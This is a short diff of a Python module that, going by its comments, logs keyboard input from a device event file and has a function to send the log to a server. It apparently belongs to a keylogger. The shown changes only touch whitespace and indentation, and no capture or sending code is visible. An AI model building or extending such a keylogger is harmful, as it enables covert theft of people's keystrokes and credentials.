@@ -4,7 +4,6 @@ import sys
 import time, threading
 #import socket
 
-
 # this function logs keyboard input parsing to English Us keyboard format 
 def run(**args):
 	# try to guess which event file to use
@@ -81,7 +80,7 @@ def run(**args):
 		if(stop-start >= 5):
 			return str(pressedKey)
 		
-		in_file.close()
+	in_file.close()
 	
 	
 # send log to the server function
